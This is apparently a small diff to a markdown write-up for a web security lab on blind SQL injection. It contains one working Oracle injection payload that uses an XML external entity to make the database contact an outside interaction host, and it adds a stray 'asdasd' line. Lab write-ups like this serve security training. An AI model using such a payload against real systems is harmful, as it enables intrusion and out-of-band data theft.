@@ -22,7 +22,7 @@ To solve the lab, exploit the SQL injection vulnerability to cause a DNS lookup 
 ```sql
 '+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//zpurqvovcezbvusckoumshfx8zrtafl87.oast.fun/">+%25remote%3b]>'),'/l')+FROM+dual--
 ```
-
+asdasd
 
 
 
